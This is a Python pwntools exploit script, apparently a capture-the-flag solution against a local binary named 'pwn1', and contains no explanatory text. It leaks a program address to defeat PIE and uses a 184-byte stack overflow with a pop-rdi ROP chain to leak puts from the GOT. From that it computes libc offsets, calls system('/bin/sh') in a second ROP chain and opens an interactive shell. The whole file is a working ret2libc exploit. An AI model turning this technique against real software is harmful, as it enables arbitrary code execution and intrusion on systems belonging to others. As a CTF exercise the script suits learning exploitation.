from pwn import *

context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn1'
p = process(name)
elf = ELF(name)
if args.G:
    gdb.attach(p)

p.recvuntil("Tell me your name:\n")
payload = "a"*8
p.send(payload)
p.recvuntil("a"*8)
pro_addr = u64(p.recv(6) + b"\x00\x00") - 0x82d
puts_got_addr = pro_addr + elf.got['puts']
puts_plt_addr = pro_addr + elf.plt['puts']
main_addr = pro_addr + elf.symbols['main']
success("pro_addr: " + hex(pro_addr))
success("puts_got_addr: " + hex(puts_got_addr))
success("puts_plt_addr: " + hex(puts_plt_addr))
success("main_addr: " + hex(main_addr))


p.recvuntil("What do you want to say?\n")
pop_rdi_addr = pro_addr + 0x843
payload1 = b"a"*184 
payload1 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)
payload1 += p64(main_addr)
p.sendline(payload1)

p.recvuntil("Bye!\n")
libc_addr = u64(p.recv(6) + b"\x00\x00") - 0x68f90
system_addr = libc_addr + 0x3f480
bin_sh_addr = libc_addr + 0x1619d9
success("libc_addr: " + hex(libc_addr))
success("system_addr: " + hex(system_addr))
success("bin_sh_addr: " + hex(bin_sh_addr))

p.recvuntil("Tell me your name:\n")
p.sendline("aaa")

p.recvuntil("What do you want to say?\n")
payload2 = b"c"*184  
payload2 += p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr) 
p.sendline(payload2)

p.interactive()